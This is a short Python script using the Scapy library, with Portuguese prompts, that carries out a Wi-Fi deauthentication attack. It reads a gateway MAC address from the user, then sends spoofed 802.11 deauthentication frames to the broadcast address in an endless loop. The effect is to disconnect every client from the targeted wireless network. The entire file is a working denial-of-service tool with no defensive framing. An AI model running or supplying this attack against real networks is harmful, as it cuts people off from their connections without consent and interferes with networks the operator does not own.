from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp, sniff
import time

gateway_mac = input("Digite aqui o número do endereço gatway_mac: ")

iface = "wlan0mon"

def deauth_all_clients():
    print("Desconectando todos os dispositivos da rede...")

    packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)

    while True:
        sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
        print("Tentando...")
        time.sleep(1)

try:
    deauth_all_clients()
except KeyboardInterrupt:
    print("OPERAÇÃO INTERROMPIDA. TODOS DISPOSITIVOS FORAM DESCONECTADOS.")